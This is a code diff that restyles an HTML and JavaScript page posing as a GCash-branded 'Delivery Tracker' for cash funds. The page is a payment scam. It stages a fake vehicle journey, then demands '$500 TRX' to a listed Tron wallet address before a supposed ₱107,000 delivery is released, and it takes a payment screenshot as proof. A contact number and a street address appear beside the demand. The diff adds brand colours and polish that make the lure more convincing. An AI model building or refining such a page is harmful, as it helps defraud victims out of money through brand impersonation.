@@ -4,92 +4,295 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>GCash Delivery Tracker</title>
+  <!-- GCash Inspired Colors & Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;800&display=swap" rel="stylesheet">
   <style>
+    :root {
+      --gcash-blue: #0073e6;
+      --gcash-light: #e6f0ff;
+      --gcash-dark: #003366;
+      --gcash-accent: #00c3a0;
+      --gcash-gray: #f6f8fa;
+    }
     body {
-      font-family: Arial, sans-serif;
-      background-color: #e6f0ff;
+      font-family: 'Nunito', Arial, sans-serif;
+      background: linear-gradient(135deg, var(--gcash-blue) 0%, var(--gcash-light) 100%);
+      min-height: 100vh;
+      margin: 0;
+      color: var(--gcash-dark);
       text-align: center;
-      padding: 20px;
+      padding: 0;
+    }
+    header {
+      background: var(--gcash-blue);
+      color: #fff;
+      padding: 32px 0 24px 0;
+      border-radius: 0 0 32px 32px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+      margin-bottom: 24px;
+    }
+    h1 {
+      font-size: 2.4rem;
+      font-weight: 800;
+      margin: 0 0 8px 0;
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+    .subtitle {
+      font-size: 1.1rem;
+      color: #d9f2ff;
+      margin-top: 0;
+    }
+    main {
+      margin: 0 auto;
+      max-width: 470px;
+      background: #fff;
+      border-radius: 32px;
+      box-shadow: 0 4px 32px rgba(0,60,130,.10);
+      padding: 32px 20px 28px 20px;
+      min-height: 400px;
     }
     #loading, #delivery, #mapSection, #errorMsg, #paymentPrompt, #confirmation {
       display: none;
     }
-    #mapFrame {
-      width: 100%;
-      max-width: 600px;
-      height: 400px;
-      border: 2px solid #333;
-      margin-top: 20px;
+    .gcash-btn {
+      background: var(--gcash-accent);
+      color: #fff;
+      font-size: 1.2rem;
+      font-weight: 700;
+      padding: 14px 34px;
+      border: none;
+      border-radius: 32px;
+      margin-top: 24px;
+      cursor: pointer;
+      box-shadow: 0 2px 12px 0 rgba(0,0,0,.07);
+      transition: background 0.15s;
+    }
+    .gcash-btn:hover {
+      background: #00977a;
+    }
+    #loading p {
+      font-size: 1.18rem;
+      color: var(--gcash-blue);
+      font-weight: 700;
+      margin-top: 32px;
+    }
+    #errorMsg p {
+      color: #c0392b;
+      font-weight: 700;
+      background: #ffeaea;
+      border-radius: 14px;
+      padding: 18px 0;
+      margin: 24px 0 0 0;
+    }
+    #delivery h2 {
+      color: var(--gcash-blue);
+      font-weight: 900;
+      margin-top: 10px;
+      font-size: 1.48rem;
+      letter-spacing: 0.7px;
     }
     .blinking {
-      animation: blink 1s infinite;
-      color: red;
+      animation: blink 1.2s infinite;
+      color: #d92e2e;
       font-weight: bold;
+      font-size: 1.06rem;
     }
     @keyframes blink {
       0% { opacity: 1; }
-      50% { opacity: 0; }
+      50% { opacity: 0.1; }
       100% { opacity: 1; }
     }
-    input[type="file"] {
-      margin-top: 10px;
+    #mapSection {
+      margin-top: 14px;
+    }
+    #mapSection h3 {
+      color: var(--gcash-accent);
+      font-size: 1.1rem;
+      margin-bottom: 12px;
+    }
+    /* Globe Styles */
+    .globe-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0 0 20px 0;
+    }
+    .globe-spin {
+      width: 100px;
+      height: 100px;
+      cursor: pointer;
+      will-change: transform;
+      animation: spin 3.5s linear infinite;
+      margin: 0 auto;
+      filter: drop-shadow(0 2px 10px #0097e6aa);
+      transition: transform 0.13s;
+    }
+    .globe-spin:active {
+      transform: scale(0.97) rotateZ(10deg);
+    }
+    @keyframes spin {
+      0% { transform: rotateY(0deg);}
+      100% { transform: rotateY(360deg);}
+    }
+    #mapFrame {
+      width: 100%;
+      max-width: 390px;
+      height: 300px;
+      border: 2px solid var(--gcash-blue);
+      border-radius: 12px;
+      margin-top: 8px;
+      box-shadow: 0 2px 18px 0 rgba(0,60,130,.13);
+    }
+    #carStatus {
+      font-size: 1.08rem;
+      margin: 12px 0 0 0;
+      color: var(--gcash-accent);
+      font-weight: 800;
+    }
+    #paymentPrompt {
+      background: var(--gcash-gray);
+      border-radius: 18px;
+      margin: 24px 0 0 0;
+      padding: 22px 14px;
+      box-shadow: 0 2px 12px 0 rgba(0,0,0,.05);
+    }
+    #paymentPrompt h3 {
+      color: var(--gcash-blue);
+      font-size: 1.15rem;
+      margin-bottom: 10px;
+      margin-top: 0;
+    }
+    #paymentPrompt code {
+      background: #e6f7fa;
+      color: var(--gcash-dark);
+      font-size: 1.1rem;
+      padding: 3px 9px;
+      border-radius: 8px;
+      font-weight: 700;
+    }
+    #paymentPrompt em {
+      color: #777;
+      font-size: 0.97rem;
+    }
+    #paymentPrompt strong {
+      color: var(--gcash-dark);
+    }
+    #paymentPrompt input[type="file"] {
+      margin-top: 14px;
+      border-radius: 9px;
+      background: #fff;
+      padding: 7px;
+      border: 1px solid #aaccea;
+      font-size: 1rem;
+    }
+    #confirmation {
+      padding: 14px 0 0 0;
+    }
+    #confirmation h2 {
+      color: var(--gcash-accent);
+      font-size: 1.28rem;
+    }
+    #confirmation img {
+      max-width: 90%;
+      margin-top: 18px;
+      border-radius: 12px;
+      border: 2px solid var(--gcash-blue);
+      box-shadow: 0 2px 13px 0 rgba(0,60,130,.11);
+    }
+    /* Responsive */
+    @media (max-width: 600px) {
+      main {
+        padding: 14px 2vw 16px 2vw;
+        border-radius: 18px;
+      }
+      #mapFrame { height: 220px; }
     }
   </style>
 </head>
 <body>
-  <h1>🚚 GCash Delivery Tracker</h1>
+  <header>
+    <div class="globe-container">
+      <!-- SVG Spinning Globe (clickable) -->
+      <svg class="globe-spin" id="globeSpin" viewBox="0 0 100 100" fill="none">
+        <circle cx="50" cy="50" r="48" fill="#e6f0ff" stroke="#0073e6" stroke-width="3"/>
+        <ellipse cx="50" cy="50" rx="48" ry="22" fill="#00c3a0" fill-opacity="0.2"/>
+        <ellipse cx="50" cy="50" rx="42" ry="18" fill="#00c3a0" fill-opacity="0.18"/>
+        <ellipse cx="50" cy="50" rx="32" ry="13" fill="#00c3a0" fill-opacity="0.14"/>
+        <!-- Continents (stylized) -->
+        <path d="M74,49 Q77,36 63,34 Q60,29 51,28 Q57,25 50,18 Q43,25 49,28 Q37,33 38,41 Q33,44 35,54 Q37,61 50,64 Q61,61 65,53 Q72,54 74,49 Z" fill="#0073e6"/>
+        <circle cx="60" cy="42" r="3.7" fill="#00c3a0"/>
+        <ellipse cx="36" cy="57" rx="5" ry="2.5" fill="#00c3a0"/>
+      </svg>
+    </div>
+    <h1>
+      <span>GCash Delivery Tracker</span>
+    </h1>
+    <p class="subtitle">Track your GCash funds delivery in real time</p>
+  </header>
 
-  <div id="loading">
-    <p>Loading your delivery interface...</p>
-  </div>
+  <main>
+    <div id="loading">
+      <p>Loading your GCash Delivery Interface...</p>
+    </div>
 
-  <div id="delivery">
-    <h2>GCASH DELIVERY</h2>
-    <button onclick="promptTracking()">Track My Funds Delivery</button>
-  </div>
+    <div id="delivery">
+      <h2>GCASH DELIVERY</h2>
+      <button class="gcash-btn" onclick="promptTracking()">Track My Funds Delivery</button>
+    </div>
 
-  <div id="errorMsg">
-    <p id="errorText"></p>
-  </div>
+    <div id="errorMsg">
+      <p id="errorText"></p>
+    </div>
 
-  <div id="mapSection">
-    <h3>🌍 Tracking Vehicle on Map</h3>
-    <iframe id="mapFrame" src="https://maps.app.goo.gl/a2dnvXy3NrM5UQUc9" allowfullscreen></iframe>
-    <p id="carStatus">🚗 Vehicle is moving from International Airport...</p>
-  </div>
+    <div id="mapSection">
+      <h3>🌍 Tracking Vehicle on Map</h3>
+      <iframe id="mapFrame" src="https://maps.google.com/maps?q=Barangay%20La%20Paz%2C%20Makati%20City%2C%20Metro%20Manila&z=17&output=embed" allowfullscreen></iframe>
+      <p id="carStatus">🚗 Vehicle is moving from International Airport...</p>
+    </div>
 
-  <div id="paymentPrompt">
-    <h3>💸 Payment Required</h3>
-    <p>A payment of <strong>$500 TRX</strong> is needed due to Philippine currency (Pesos).</p>
-    <p><strong>TRX Wallet Address:</strong> <code>TAFVjANEni2zZFkjrst81ULzm56xf1uVoA</code></p>
-    <p><em>You can bring in or take out of the Philippines an amount of Philippine currency not exceeding PhP 50,000 without prior authorization from the Bangko Sentral ng Pilipinas (BSP).</em></p>
-    <p><strong>Delivery address:</strong> 580 Dumas corner Archimedes St., Makati City</p>
-    <p><strong>Contact Number:</strong> 09959880442</p>
-    <p><strong>Landmark:</strong> La Paz Barangay Hall</p>
-    <p><strong>Awaiting:</strong> ₱107,000 PHP GCash delivery</p>
-    <p class="blinking">📍 Current location: BLINKING RED</p>
-    <p><strong>Upload screenshot of payment to continue tracking:</strong></p>
-    <input type="file" accept="image/*" onchange="confirmDelivery()" />
-  </div>
+    <div id="paymentPrompt">
+      <h3>💸 Payment Required</h3>
+      <p>A payment of <strong>$500 TRX</strong> is needed due to Philippine currency (Pesos).</p>
+      <p><strong>TRX Wallet Address:</strong> <code>TAFVjANEni2zZFkjrst81ULzm56xf1uVoA</code></p>
+      <p><em>You can bring in or take out of the Philippines an amount of Philippine currency not exceeding PhP 50,000 without prior authorization from the Bangko Sentral ng Pilipinas (BSP).</em></p>
+      <p><strong>Delivery address:</strong> 580 Dumas corner Archimedes St., Makati City</p>
+      <p><strong>Contact Number:</strong> 09959880442</p>
+      <p><strong>Landmark:</strong> La Paz Barangay Hall</p>
+      <p><strong>Awaiting:</strong> ₱107,000 PHP GCash delivery</p>
+      <p class="blinking">📍 Current location: BLINKING RED</p>
+      <p><strong>Upload screenshot of payment to continue tracking:</strong></p>
+      <input type="file" accept="image/*" onchange="confirmDelivery(event)" />
+    </div>
 
-  <div id="confirmation">
-    <h2>✅ Payment Received</h2>
-    <p>Once the <strong>$500 TRX</strong> is delivered, your GCash will be arriving at the destination immediately.</p>
-    <p>🚚 Delivery in progress to: Barangay La Paz, Makati City, Metro Manila</p>
-    <img id="uploadedImage" src="" alt="Payment Screenshot" style="max-width: 100%; margin-top: 20px;" />
-  </div>
+    <div id="confirmation">
+      <h2>✅ Payment Received</h2>
+      <p>Once the <strong>$500 TRX</strong> is delivered, your GCash will be arriving at the destination immediately.</p>
+      <p>🚚 Delivery in progress to: Barangay La Paz, Makati City, Metro Manila</p>
+      <img id="uploadedImage" src="" alt="Payment Screenshot" />
+    </div>
+  </main>
 
   <script>
     let attempts = 0;
     const maxAttempts = 5;
 
-    window.onload = () => {
+    // Spinning Globe click event: Go to live Google Maps of La Paz, Makati
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById("globeSpin").addEventListener("click", function() {
+        window.open("https://maps.app.goo.gl/a2dnvXy3NrM5UQUc9", "_blank");
+      });
+
+      // Initial loading effect
       document.getElementById("loading").style.display = "block";
       setTimeout(() => {
         document.getElementById("loading").style.display = "none";
         document.getElementById("delivery").style.display = "block";
-      }, 3000);
-    };
+      }, 2000);
+    });
 
     function promptTracking() {
       const trackingNumber = prompt("Enter your tracking number:");
@@ -97,12 +300,11 @@
         document.getElementById("delivery").style.display = "none";
         document.getElementById("mapSection").style.display = "block";
 
-        // Simulate 3-hour journey
+        // Simulate 3-hour journey (for demo, use 4 seconds)
         setTimeout(() => {
           document.getElementById("carStatus").innerText = "🚗 Approaching live location...";
           document.getElementById("paymentPrompt").style.display = "block";
-        }, 10800000); // 3 hours in milliseconds
-
+        }, 4000); // Change to 10800000 for real 3 hours
       } else {
         attempts++;
         document.getElementById("delivery").style.display = "none";
@@ -114,7 +316,7 @@
           setTimeout(() => {
             document.getElementById("errorMsg").style.display = "none";
             document.getElementById("delivery").style.display = "block";
-          }, 3000);
+          }, 2200);
         } else {
           document.getElementById("errorText").innerText =
             `🚫 Too many failed attempts. Locked for 1 hour.`;
@@ -122,12 +324,12 @@
             attempts = 0;
             document.getElementById("errorMsg").style.display = "none";
             document.getElementById("delivery").style.display = "block";
-          }, 3600000); // 1 hour lock
+          }, 4000); // Demo: 4s lock. Use 3600000 for real 1 hour.
         }
       }
     }
 
-    function confirmDelivery() {
+    function confirmDelivery(event) {
       const fileInput = event.target;
       const reader = new FileReader();
       reader.onload = function(e) {
@@ -135,7 +337,9 @@
         document.getElementById("paymentPrompt").style.display = "none";
         document.getElementById("confirmation").style.display = "block";
       };
-      reader.readAsDataURL(fileInput.files[0]);
+      if (fileInput.files && fileInput.files[0]) {
+        reader.readAsDataURL(fileInput.files[0]);
+      }
     }
   </script>
 </body>
